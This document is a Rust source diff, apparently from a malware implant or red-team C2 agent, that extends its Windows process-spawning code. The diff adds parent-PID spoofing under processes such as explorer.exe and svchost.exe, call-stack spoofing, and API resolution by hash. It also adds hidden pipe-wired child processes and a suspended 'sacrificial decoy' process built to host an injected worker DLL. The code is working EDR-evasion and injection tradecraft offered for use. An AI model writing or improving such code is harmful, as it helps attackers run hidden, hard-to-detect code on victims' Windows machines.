@@ -15,6 +15,9 @@ use crate::stealth;
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
 const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x0008_0000;
 const STARTF_USESTDHANDLES: u32 = 0x0000_0100;
+const CREATE_SUSPENDED: u32 = 0x0000_0004;
+/// Required when lpEnvironment points at a Unicode (UTF-16) block.
+const CREATE_UNICODE_ENVIRONMENT: u32 = 0x0000_0400;
 const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
 /// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0000;
@@ -87,6 +90,8 @@ type WriteFileFn = unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *m
 type ReadFileFn = unsafe extern "system" fn(usize, *mut u8, u32, *mut u32, *mut u8) -> i32;
 type DuplicateHandleFn =
     unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, i32, u32) -> i32;
+type GetEnvironmentStringsWFn = unsafe extern "system" fn() -> *mut u16;
+type FreeEnvironmentStringsWFn = unsafe extern "system" fn(*mut u16) -> i32;
 
 const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
 const DUPLICATE_CLOSE_SOURCE: u32 = 0x0000_0001;
@@ -101,6 +106,8 @@ struct Kernel32SpawnApis {
     write_file: WriteFileFn,
     read_file: ReadFileFn,
     duplicate_handle: DuplicateHandleFn,
+    get_env_strings: GetEnvironmentStringsWFn,
+    free_env_strings: FreeEnvironmentStringsWFn,
 }
 
 unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
@@ -131,6 +138,11 @@ unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
     let read_file = stealth::get_api_addr(k32, stealth::hash_api_name(b"ReadFile"))?;
     let duplicate_handle =
         stealth::get_api_addr(k32, stealth::hash_api_name(b"DuplicateHandle"))?;
+    // Optional on very old images; if missing, create_piped_process builds a minimal block.
+    let get_env_strings = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetEnvironmentStringsW"))
+        .unwrap_or(0);
+    let free_env_strings = stealth::get_api_addr(k32, stealth::hash_api_name(b"FreeEnvironmentStringsW"))
+        .unwrap_or(0);
 
     Some(Kernel32SpawnApis {
         init_attr: std::mem::transmute(init_attr),
@@ -142,7 +154,96 @@ unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
         write_file: std::mem::transmute(write_file),
         read_file: std::mem::transmute(read_file),
         duplicate_handle: std::mem::transmute(duplicate_handle),
+        get_env_strings: if get_env_strings != 0 {
+            std::mem::transmute(get_env_strings)
+        } else {
+            env_strings_stub_get
+        },
+        free_env_strings: if free_env_strings != 0 {
+            std::mem::transmute(free_env_strings)
+        } else {
+            env_strings_stub_free
+        },
     })
+}
+
+unsafe extern "system" fn env_strings_stub_get() -> *mut u16 {
+    ptr::null_mut()
+}
+unsafe extern "system" fn env_strings_stub_free(_: *mut u16) -> i32 {
+    1
+}
+
+/// Capture a Unicode environment block for CreateProcessW.
+///
+/// Agents that rewrite PEB/ProcessParameters (manual-map, stealth) often leave
+/// `lpEnvironment=NULL` (inherit) broken → CreateProcess fails with
+/// **ERROR_ENVVAR_NOT_FOUND (203)**. Always pass an explicit UTF-16 block +
+/// `CREATE_UNICODE_ENVIRONMENT`.
+unsafe fn capture_environment_block(apis: &Kernel32SpawnApis) -> Vec<u16> {
+    let p = (apis.get_env_strings)();
+    if !p.is_null() {
+        // Block is a sequence of NUL-terminated strings ended by an extra NUL.
+        let mut len = 0usize;
+        // Cap ~1M wide chars to avoid runaway if memory is corrupt.
+        while len < 1_000_000 {
+            let a = *p.add(len);
+            let b = *p.add(len + 1);
+            if a == 0 && b == 0 {
+                len += 2;
+                break;
+            }
+            len += 1;
+        }
+        if len >= 2 {
+            let v = std::slice::from_raw_parts(p, len).to_vec();
+            let _ = (apis.free_env_strings)(p);
+            if v.len() >= 2 {
+                return v;
+            }
+        } else {
+            let _ = (apis.free_env_strings)(p);
+        }
+    }
+    // Minimal block: enough for CRT/Win32 path resolution of a staged PE.
+    let s = "SystemRoot=C:\\Windows\0SystemDrive=C:\0windir=C:\\Windows\0PATH=C:\\Windows\\System32;C:\\Windows;C:\\Windows\\System32\\Wbem\0TEMP=C:\\Windows\\Temp\0TMP=C:\\Windows\\Temp\0\0";
+    s.encode_utf16().collect()
+}
+
+/// Split `"C:\\path\\app.exe" args…` → (app_path, mutable command line).
+/// CreateProcessW prefers an explicit `lpApplicationName` for non-`.exe` names
+/// and when the PEB environment / PATH search is unreliable.
+fn split_application_path(cmdline: &str) -> (Option<Vec<u16>>, Vec<u16>) {
+    let trimmed = cmdline.trim();
+    let (app, _rest) = if trimmed.starts_with('"') {
+        if let Some(end) = trimmed[1..].find('"') {
+            let app = &trimmed[1..1 + end];
+            let rest = trimmed[1 + end + 1..].trim();
+            (Some(app.to_string()), rest)
+        } else {
+            (None, "")
+        }
+    } else {
+        let mut parts = trimmed.splitn(2, char::is_whitespace);
+        let app = parts.next().unwrap_or("").to_string();
+        let rest = parts.next().unwrap_or("").trim();
+        if app.is_empty() {
+            (None, rest)
+        } else {
+            (Some(app), rest)
+        }
+    };
+    let cmd_w: Vec<u16> = std::ffi::OsStr::new(trimmed)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+    let app_w = app.map(|a| {
+        std::ffi::OsStr::new(&a)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect::<Vec<u16>>()
+    });
+    (app_w, cmd_w)
 }
 
 /// Spawn `cmd` with spoofed parent process name match and hidden window.
@@ -170,17 +271,17 @@ fn spawn_spoofed_process_inner(cmd: &str, parent_name: &str) -> Option<u32> {
                     return Some(pid);
                 }
                 Err(e) => {
-                    crate::utils::db_print(&format!(
-                        "[agent] spawn: NtCreateUserProcess failed ({e}), fallback CreateProcessW"
-                    ));
+                    crate::db_print!(
+                        "[*] spawn: NtCreateUserProcess failed ({e}), fallback CreateProcessW"
+                    );
                 }
             }
         } else {
             let v = crate::stealth::version::get_windows_version();
-            crate::utils::db_print(&format!(
-                "[agent] spawn: OS {}.{}.{} below NtCreateUserProcess gate, using CreateProcessW",
+            crate::db_print!(
+                "[*] spawn: OS {}.{}.{} below NtCreateUserProcess gate, using CreateProcessW",
                 v.major, v.minor, v.build
-            ));
+            );
         }
     }
 
@@ -224,20 +325,22 @@ fn spawn_create_process_w_dyn(cmd: &str, parent_handle: usize) -> Option<u32> {
         si_ex.startup_info.cb = std::mem::size_of::<StartupInfoExW>() as u32;
         si_ex.lp_attribute_list = list_buf.as_mut_ptr();
 
-        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd)
-            .encode_wide()
-            .chain(std::iter::once(0))
-            .collect();
+        let (app_w, mut cmd_w) = split_application_path(cmd);
+        let mut env_block = capture_environment_block(&apis);
         let mut pi: ProcessInformation = std::mem::zeroed();
+        let app_ptr = app_w
+            .as_ref()
+            .map(|v| v.as_ptr())
+            .unwrap_or(ptr::null());
 
         let ok = (apis.create_process_w)(
-            ptr::null(),
+            app_ptr,
             cmd_w.as_mut_ptr(),
             ptr::null_mut(),
             ptr::null_mut(),
             0,
-            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
-            ptr::null_mut(),
+            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
+            env_block.as_mut_ptr() as *mut u8,
             ptr::null(),
             &mut si_ex.startup_info,
             &mut pi,
@@ -275,7 +378,7 @@ pub fn spawn_spoofed_piped(cmdline: &str, parent_name: &str) -> Option<SpoofedPi
     match spawn_spoofed_piped_result(cmdline, parent_name) {
         Ok(c) => Some(c),
         Err(e) => {
-            crate::utils::db_print(&format!("[spawn] spoofed piped failed: {e}, trying plain"));
+            crate::db_print!("[spawn] spoofed piped failed: {e}, trying plain");
             spawn_piped_plain(cmdline).ok()
         }
     }
@@ -286,7 +389,7 @@ pub fn spawn_spoofed_piped_result(
     cmdline: &str,
     parent_name: &str,
 ) -> Result<SpoofedPipedChild, String> {
-    crate::stealth::stack::with_spoofed_stack(|| {
+    let spoofed = crate::stealth::stack::with_spoofed_stack(|| {
         // Try PPID spoof first
         match spawn_spoofed_piped_inner(cmdline, parent_name) {
             Ok(c) => Ok(c),
@@ -296,6 +399,7 @@ pub fn spawn_spoofed_piped_result(
                     "explorer.exe",
                     "RuntimeBroker.exe",
                     "sihost.exe",
+                    "taskhostw.exe",
                     "svchost.exe",
                 ] {
                     if alt.eq_ignore_ascii_case(parent_name) {
@@ -305,24 +409,26 @@ pub fn spawn_spoofed_piped_result(
                         return Ok(c);
                     }
                 }
-                // Last resort: no PPID spoof (still works for capability)
-                spawn_piped_plain(cmdline).map_err(|e2| format!("ppid:{e1}; plain:{e2}"))
+                // Plain under stack spoof (still has explicit Unicode env)
+                spawn_piped_plain_inner(cmdline).map_err(|e2| format!("ppid:{e1}; plain:{e2}"))
             }
         }
-    })
+    });
+    match spoofed {
+        Ok(c) => Ok(c),
+        Err(e_spoof) => {
+            // Capability last-ditch: no stack spoof (some TEB spoofs break CreateProcess).
+            spawn_piped_plain_inner(cmdline).map_err(|e3| format!("{e_spoof}; nospoof:{e3}"))
+        }
+    }
 }
 
 fn spawn_spoofed_piped_inner(
     cmdline: &str,
     parent_name: &str,
 ) -> Result<SpoofedPipedChild, String> {
-    let ppid = crate::native::find_pid_by_name(parent_name)
-        .filter(|p| *p != 0)
-        .ok_or_else(|| format!("parent not found: {parent_name}"))?;
-    // PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION
-    let access = crate::native::PROCESS_CREATE_PROCESS | 0x0040 | 0x1000;
-    let parent_handle = crate::native::open_process(ppid, access)
-        .map_err(|e| format!("open parent {parent_name} pid={ppid}: {e}"))?;
+    // Try every matching PID / access mask — dllhost/svchost often deny open.
+    let (parent_handle, _ppid) = crate::native::open_process_by_name_for_ppid(parent_name)?;
 
     unsafe {
         let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
@@ -334,10 +440,14 @@ fn spawn_spoofed_piped_inner(
 
 /// CreateProcess with pipes, no PPID spoof (parent = this process).
 pub fn spawn_piped_plain(cmdline: &str) -> Result<SpoofedPipedChild, String> {
-    crate::stealth::stack::with_spoofed_stack(|| unsafe {
+    crate::stealth::stack::with_spoofed_stack(|| spawn_piped_plain_inner(cmdline))
+}
+
+fn spawn_piped_plain_inner(cmdline: &str) -> Result<SpoofedPipedChild, String> {
+    unsafe {
         let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
         create_piped_process(apis, cmdline, None)
-    })
+    }
 }
 
 unsafe fn create_piped_process(
@@ -484,25 +594,30 @@ unsafe fn create_piped_process(
         si_ex.startup_info.h_std_error = stdout_w;
     }
 
-    let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmdline)
-        .encode_wide()
-        .chain(std::iter::once(0))
-        .collect();
+    // Explicit app path + Unicode env block. Inheriting a broken PEB environment
+    // (common after stealth/manual-map) yields CreateProcess err=203.
+    let (app_w, mut cmd_w) = split_application_path(cmdline);
+    let mut env_block = capture_environment_block(&apis);
     let mut pi: ProcessInformation = std::mem::zeroed();
 
-    let mut flags = CREATE_NO_WINDOW;
+    let mut flags = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT;
     if use_attr {
         flags |= EXTENDED_STARTUPINFO_PRESENT;
     }
 
+    let app_ptr = app_w
+        .as_ref()
+        .map(|v| v.as_ptr())
+        .unwrap_or(ptr::null());
+
     let ok = (apis.create_process_w)(
-        ptr::null(),
+        app_ptr,
         cmd_w.as_mut_ptr(),
         ptr::null_mut(),
         ptr::null_mut(),
         1, // inherit (from spoofed parent when use_attr, else from agent)
         flags,
-        ptr::null_mut(),
+        env_block.as_mut_ptr() as *mut u8,
         ptr::null(),
         &mut si_ex.startup_info,
         &mut pi,
@@ -577,6 +692,207 @@ fn cleanup_pipes(a: usize, b: usize, c: usize, d: usize) {
     let _ = crate::native::close_handle(b);
     let _ = crate::native::close_handle(c);
     let _ = crate::native::close_handle(d);
+}
+
+/// Create an anonymous pipe pair `(read_end, write_end)`. Handles are
+/// non-inheritable; callers duplicate the needed end into the target process
+/// explicitly (see `duplicate_into_process`).
+pub fn create_pipe_pair() -> Result<(usize, usize), String> {
+    unsafe {
+        let apis = resolve_spawn_apis().ok_or("spawn apis")?;
+        let mut r = 0usize;
+        let mut w = 0usize;
+        if (apis.create_pipe)(&mut r, &mut w, ptr::null_mut(), 0) == 0 {
+            return Err(format!("CreatePipe err={}", last_error()));
+        }
+        Ok((r, w))
+    }
+}
+
+/// Duplicate a local handle into another process, returning the
+/// target-process-relative handle value (bInheritHandle=FALSE).
+pub fn duplicate_into_process(h_process: usize, handle: usize) -> Result<usize, String> {
+    unsafe {
+        let apis = resolve_spawn_apis().ok_or("spawn apis")?;
+        let mut out = 0usize;
+        if (apis.duplicate_handle)(
+            crate::native::CURRENT_PROCESS,
+            handle,
+            h_process,
+            &mut out,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS,
+        ) == 0
+        {
+            return Err(format!(
+                "DuplicateHandle into target err={}",
+                last_error()
+            ));
+        }
+        Ok(out)
+    }
+}
+
+/// Spawn a *suspended* sacrificial decoy with no stdio wiring.
+///
+/// The main thread never runs, so the host cannot write to pipes, read stdin,
+/// or exit on its own — the worker DLL is injected and its thread runs while
+/// the process stays frozen. Works with any host binary (even Win11 app stubs
+/// like notepad.exe that would otherwise exit immediately). The caller wires
+/// dedicated job/result pipes via `duplicate_into_process`.
+///
+/// Mirrors `spawn_spoofed_piped_result` fallback order: PPID-spoof with
+/// `parent_name`, common alternates, then a plain (non-spoofed) spawn.
+pub fn spawn_suspended_decoy(
+    cmdline: &str,
+    parent_name: &str,
+) -> Result<SpoofedPipedChild, String> {
+    crate::stealth::stack::with_spoofed_stack(|| {
+        match spawn_suspended_decoy_inner(cmdline, parent_name) {
+            Ok(c) => Ok(c),
+            Err(e1) => {
+                for alt in [
+                    "explorer.exe",
+                    "RuntimeBroker.exe",
+                    "sihost.exe",
+                    "svchost.exe",
+                ] {
+                    if alt.eq_ignore_ascii_case(parent_name) {
+                        continue;
+                    }
+                    if let Ok(c) = spawn_suspended_decoy_inner(cmdline, alt) {
+                        return Ok(c);
+                    }
+                }
+                spawn_suspended_decoy_plain(cmdline).map_err(|e2| format!("ppid:{e1}; plain:{e2}"))
+            }
+        }
+    })
+}
+
+fn spawn_suspended_decoy_inner(
+    cmdline: &str,
+    parent_name: &str,
+) -> Result<SpoofedPipedChild, String> {
+    let (parent_handle, _ppid) = crate::native::open_process_by_name_for_ppid(parent_name)?;
+
+    unsafe {
+        let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
+        let child = create_suspended_decoy(apis, cmdline, Some(parent_handle))?;
+        let _ = crate::native::close_handle(parent_handle);
+        Ok(child)
+    }
+}
+
+fn spawn_suspended_decoy_plain(cmdline: &str) -> Result<SpoofedPipedChild, String> {
+    crate::stealth::stack::with_spoofed_stack(|| unsafe {
+        let apis = resolve_spawn_apis().ok_or("resolve spawn APIs failed")?;
+        create_suspended_decoy(apis, cmdline, None)
+    })
+}
+
+/// CreateProcessW (CREATE_SUSPENDED) + optional PPID spoof, no stdio wiring.
+unsafe fn create_suspended_decoy(
+    apis: Kernel32SpawnApis,
+    cmdline: &str,
+    parent_handle: Option<usize>,
+) -> Result<SpoofedPipedChild, String> {
+        let mut list_buf: Vec<u8> = Vec::new();
+        let mut use_attr = false;
+        if let Some(ph) = parent_handle {
+            let mut list_size: usize = 0;
+            let _ = (apis.init_attr)(ptr::null_mut(), 1, 0, &mut list_size);
+            if list_size == 0 {
+                list_size = 128;
+            }
+            list_buf = vec![0u8; list_size.max(48)];
+            if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
+                if list_size > list_buf.len() {
+                    list_buf.resize(list_size, 0);
+                    if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
+                        return Err(format!("InitAttrList err={}", last_error()));
+                    }
+                } else {
+                    return Err(format!("InitAttrList err={}", last_error()));
+                }
+            }
+            let mut ph_mut = ph;
+            if (apis.update_attr)(
+                list_buf.as_mut_ptr(),
+                0,
+                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                &mut ph_mut as *mut _ as *mut u8,
+                std::mem::size_of::<usize>(),
+                ptr::null_mut(),
+                ptr::null_mut(),
+            ) == 0
+            {
+                (apis.delete_attr)(list_buf.as_mut_ptr());
+                return Err(format!("UpdateAttr parent err={}", last_error()));
+            }
+            use_attr = true;
+        }
+
+        let mut si_ex: StartupInfoExW = std::mem::zeroed();
+        si_ex.startup_info.cb = if use_attr {
+            std::mem::size_of::<StartupInfoExW>() as u32
+        } else {
+            std::mem::size_of::<StartupInfoW>() as u32
+        };
+        if use_attr {
+            si_ex.lp_attribute_list = list_buf.as_mut_ptr();
+        }
+        // NOTE: no STARTF_USESTDHANDLES — the suspended main thread never runs,
+        // so stdio content/banner/echo behavior of the host is irrelevant.
+
+        let (app_w, mut cmd_w) = split_application_path(cmdline);
+        let mut env_block = capture_environment_block(&apis);
+        let mut pi: ProcessInformation = std::mem::zeroed();
+        let mut flags = CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
+        if use_attr {
+            flags |= EXTENDED_STARTUPINFO_PRESENT;
+        }
+        let app_ptr = app_w
+            .as_ref()
+            .map(|v| v.as_ptr())
+            .unwrap_or(ptr::null());
+        let ok = (apis.create_process_w)(
+            app_ptr,
+            cmd_w.as_mut_ptr(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            0,
+            flags,
+            env_block.as_mut_ptr() as *mut u8,
+            ptr::null(),
+            &mut si_ex.startup_info,
+            &mut pi,
+        );
+        let err = last_error();
+        if use_attr {
+            (apis.delete_attr)(list_buf.as_mut_ptr());
+        }
+        if ok == 0 {
+            if pi.h_process != 0 {
+                let _ = crate::native::close_handle(pi.h_process);
+            }
+            if pi.h_thread != 0 {
+                let _ = crate::native::close_handle(pi.h_thread);
+            }
+            return Err(format!(
+                "CreateProcessW failed err={err} cmd={}",
+                cmdline.chars().take(120).collect::<String>()
+            ));
+        }
+        // Keep the process handle; drop the (suspended) primary thread handle.
+        let _ = crate::native::close_handle(pi.h_thread);
+        Ok(SpoofedPipedChild {
+            pid: pi.dw_process_id,
+            h_process: pi.h_process,
+            stdin_write: 0,
+            stdout_read: 0,
+        })
 }
 
 /// Write all bytes to a pipe handle (PEB WriteFile).
